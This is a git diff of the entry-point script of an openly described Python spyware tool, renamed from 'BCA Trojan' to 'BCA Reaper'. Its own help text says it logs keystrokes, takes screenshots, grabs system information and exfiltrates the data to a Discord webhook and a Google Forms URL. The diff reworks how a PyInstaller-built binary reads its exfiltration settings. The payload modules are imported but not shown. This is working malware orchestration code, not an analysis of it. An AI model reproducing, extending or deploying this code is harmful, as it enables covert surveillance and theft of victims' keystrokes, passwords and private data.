@@ -1,15 +1,12 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-Trojan
+# https://github.com/EONRaider/BCA-Reaper
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import argparse
-import configparser
 import os
 import platform
-import sys
 from concurrent.futures import ThreadPoolExecutor
-from pathlib import Path
 from uuid import uuid4
 
 from src.modules import (
@@ -21,13 +18,12 @@ from src.modules import (
 )
 
 
-class Trojan:
+class Reaper:
     def __init__(self, *,
                  exfil_time: float,
                  discord_webhook: str = None,
                  google_forms_url: str = None):
-        """Set up a Trojan composed of exploitation and exfiltration
-        modules.
+        """Set up Reaper with exploitation and exfiltration modules.
 
         :param exfil_time: Time in seconds to wait between periodic
             executions of the exfiltration of logged data. Set to
@@ -76,9 +72,9 @@ class Trojan:
                 executor.submit(module.execute)
 
 
-def cli_parser() -> argparse.Namespace:
+def parse_cli() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
-        description="BCA Trojan - Log keystrokes, takes screenshots, grab "
+        description="BCA Reaper - Log keystrokes, take screenshots, grab "
                     "system information and exfiltrate to Discord and Google "
                     "Forms"
     )
@@ -104,42 +100,34 @@ def cli_parser() -> argparse.Namespace:
              "to perform a single operation."
     )
 
-    args = parser.parse_args()
-
-    if not any((args.webhook, args.forms)):
-        raise SystemExit(
-            "Error: At least one exfiltration method is required to run/build "
-            "the application. Set a Discord webhook and/or a Google Forms "
-            "URL and try again."
-        )
-
-    return args
+    return parser.parse_args()
 
 
 if __name__ == "__main__":
-    try:
-        '''Trojan is executed as a binary compiled by PyInstaller. All 
-        configuration options are read from the 'trojan.cfg' file that 
-        is bundled in the binary during the build process defined in the 
-        'build.py' file. In this case the location of all added data 
-        will be a temporary directory set by sys._MEIPASS. If such 
-        directory does not exist then an AttributeError is raised.'''
-        tmp_dir = Path(sys._MEIPASS)
-        config = configparser.ConfigParser()
-        config.read(tmp_dir.joinpath("trojan.cfg"))
-        client_cfg = config["TROJAN"]
-        Trojan(
-            discord_webhook=client_cfg.get("Webhook"),
-            google_forms_url=client_cfg.get("GoogleFormsUrl"),
-            exfil_time=client_cfg.getint("ExfiltrationTime")
-        ).execute()
-    except AttributeError:
-        '''Trojan is executed from source code by the system interpreter 
+    _args = parse_cli()
+
+    if not all((_args.webhook, _args.forms)):
+        '''Reaper is executed as a binary compiled by PyInstaller. All 
+        configuration options are read from the 'config.py' file that 
+        is created and bundled in the binary during the build process 
+        defined by 'build.py'.'''
+        import importlib
+        try:
+            args = importlib.import_module("config")
+        except ModuleNotFoundError:
+            raise SystemExit(
+                "Error: At least one exfiltration method is required to "
+                "run/build the application. Set a Discord webhook and/or a "
+                "Google Forms URL and try again."
+            )
+    else:
+        '''Reaper is executed from source code by the system interpreter 
         for development purposes. All configuration options are parsed 
         from the CLI.'''
-        _args = cli_parser()
-        Trojan(
-            discord_webhook=_args.webhook,
-            google_forms_url=_args.forms,
-            exfil_time=_args.exfil_time
-        ).execute()
+        args = _args
+
+    Reaper(
+        exfil_time=int(args.exfil_time),
+        discord_webhook=args.webhook,
+        google_forms_url=args.forms
+    ).execute()
